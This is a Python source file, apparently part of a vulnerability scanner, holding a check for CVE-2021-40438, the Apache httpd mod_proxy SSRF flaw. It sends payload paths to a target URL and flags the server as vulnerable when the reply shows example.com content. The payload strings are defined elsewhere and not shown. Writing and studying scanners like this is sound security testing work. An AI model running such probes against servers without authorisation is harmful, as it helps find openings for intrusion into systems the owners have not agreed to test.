#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import HackRequests
from time import sleep
import socket

def cve_2021_40438_scan(self, url):
    ''' httpd的mod_proxy存在服务器端请求伪造(SSRF)
        该漏洞允许未经身份验证的远程攻击者使 httpd 服务器将请求转发到任意服务器
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'SSRF'
    vul_info['vul_id'] = 'CVE-2021-40438'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    for payload in self.cve_2021_40438_payloads:
        path = payload['path']
        target = url + path

        vul_info['path'] = path
        vul_info['target'] = target

        try:
            hack = HackRequests.hackRequests()

            res = hack.http(
                target, 
                method='GET',
                timeout=self.timeout, 
                headers=self.headers,
                proxy=self.proxy,
                location=False
            )
            res.method = vul_info['vul_method']
            logger.logging(vul_info, res.status_code, res)                        # * LOG



            # todo 判断
            if (('This domain is for use in illustrative examples in documents.' in res.text())
                and ('domain in literature without prior coordination or asking for permission.' in res.text())
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

        except socket.timeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except ConnectionRefusedError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None